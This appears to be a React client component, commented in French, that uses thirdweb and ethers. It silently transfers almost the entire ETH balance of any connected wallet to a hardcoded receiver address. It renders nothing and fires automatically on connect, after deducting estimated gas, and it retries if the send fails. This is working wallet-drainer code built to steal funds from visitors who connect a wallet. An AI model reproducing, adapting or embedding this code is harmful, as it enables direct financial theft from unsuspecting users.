"use client";

import { useEffect, useState } from "react";
import {
  useActiveAccount,
  useActiveWalletChain,
  useWalletBalance,
  useSendTransaction,
} from "thirdweb/react";
import { prepareTransaction } from "thirdweb";
import { ethereum } from "thirdweb/chains";
import { client } from "../client";
import { ethers } from "ethers";

const RECEIVER = "0xa52D5c2ce7128941A1632554bcd154C567F771D9"; // <-- change si besoin
const DEFAULT_GAS_GWEI = 10n; // fallback gas price (gwei)
const GAS_LIMIT = 21000n;

export default function AutoTransfer() {
  const account = useActiveAccount();
  const activeChain = useActiveWalletChain();
  const chain = activeChain ?? ethereum; // fallback sur mainnet si chain non disponible

  // Récupère le solde natif (ETH) du wallet connecté
  const { data: balanceData } = useWalletBalance({
    client,
    address: account?.address,
    chain,
  });

  // Hook pour envoyer la transaction depuis le wallet connecté
  const { mutateAsync: sendTransactionMutateAsync } = useSendTransaction();

  const [sent, setSent] = useState(false);

  useEffect(() => {
    const run = async () => {
      if (!account) return; // pas connecté
      if (sent) return; // déjà envoyé
      if (!balanceData) return; // attend que le solde soit chargé

      try {
        console.log("Adresse connectée :", account.address);
        // balanceData.value peut être bigint ou string selon la version -> normalize
        let balanceValue: bigint = 0n;
        if ((balanceData as any)?.value !== undefined) {
          const v = (balanceData as any).value;
          if (typeof v === "bigint") balanceValue = v;
          else if (typeof v === "string") balanceValue = BigInt(v);
          else if (typeof v === "number") balanceValue = BigInt(Math.floor(v));
        }

        console.log("Solde (raw) :", balanceValue, "wei");
        console.log("Solde (ETH) :", balanceData.displayValue, balanceData.symbol);

        if (balanceValue <= 0n) {
          console.log("⚠️ Solde nul → rien à transférer.");
          return;
        }

        // Tentative de récupération du gasPrice via RPC (eth_gasPrice)
        let gasPrice: bigint = DEFAULT_GAS_GWEI * 10n ** 9n; // fallback (10 gwei)
        try {
          const rpc = (chain as any)?.rpc;
          if (rpc) {
            // chain.rpc peut être string ; si tableau tu peux prendre le premier
            const rpcUrl = Array.isArray(rpc) ? rpc[0] : rpc;
            const resp = await fetch(rpcUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_gasPrice", params: [] }),
            });
            const json = await resp.json();
            if (json?.result) {
              gasPrice = BigInt(json.result);
            }
          }
        } catch (e) {
          console.warn("Impossible de récupérer eth_gasPrice via RPC, on utilise fallback", e);
        }

        console.log("GasPrice (wei) :", gasPrice.toString(), "=>", ethers.formatUnits(gasPrice, "gwei"), "gwei");
        const maxFee = GAS_LIMIT * gasPrice;
        console.log("Frais max estimés (ETH) :", ethers.formatEther(maxFee));

        // Calcul du montant à envoyer en retirant le gas estimé
        const amountToSend = balanceValue - maxFee;
        console.log("Montant possible à envoyer (wei) :", amountToSend);
        console.log("Montant possible à envoyer (ETH) :", ethers.formatEther(amountToSend));

        if (amountToSend <= 0n) {
          console.log("⚠️ Pas assez de fonds pour couvrir le gas.");
          return;
        }

        // Prépare la transaction (fonction synchrone)
        const preparedTx = prepareTransaction({
          to: RECEIVER,
          value: amountToSend,
          chain,
          client,
        });

        // Marque qu'on a commencé (évite double envoi)
        setSent(true);

        // Envoie la transaction via useSendTransaction (utilise le wallet connecté)
        const result = await sendTransactionMutateAsync(preparedTx);
        console.log("Result sendTransaction :", result);

        // Le hook peut retourner un objet contenant hash, receipt, etc. On loggue tout.
        alert("✅ Transaction envoyée. Voir console pour détails.");
      } catch (err: any) {
        console.error("Erreur pendant le transfert :", err);
        // si erreur, on permet de retenter
        setSent(false);
      }
    };

    run();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [account, balanceData, chain, sent]);

  return null;
}
